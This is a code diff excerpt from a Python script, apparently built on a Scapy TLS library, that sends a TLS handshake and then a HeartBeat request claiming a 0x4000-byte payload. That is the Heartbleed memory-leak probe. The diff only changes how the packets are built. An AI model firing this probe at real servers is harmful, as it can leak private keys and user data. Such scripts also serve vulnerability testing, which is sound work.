@@ -50,13 +50,13 @@ def main(opts):
     
     
     print "[ -> ] sending TLS Handshake"
-    resp = tcp/Raw(data=serialize(TLSRecord(version=0x0302, content_type=0x16)/TLSHandshake(version=0x0302)))
+    resp = tcp/(TLSRecord(version=0x0302, content_type=0x16)/TLSHandshake(version=0x0302))
     print "[ <- ] response: %s"%(len(resp) if resp else 0)
     hexdump_squashed(resp)
     print repr(TLSRecord(__raw=resp))
     
     print "[ -> ] sending TLS Handshake"
-    resp = tcp/Raw(data=serialize(TLSRecord(version=0x0302)/TLSHeartBeat(payload_length=0x4000)))
+    resp = tcp/(TLSRecord(version=0x0302)/TLSHeartBeat(payload_length=0x4000))
     print "[ <- ] response: %s"%(len(resp) if resp else 0)
     if not resp:
         print "no response!"
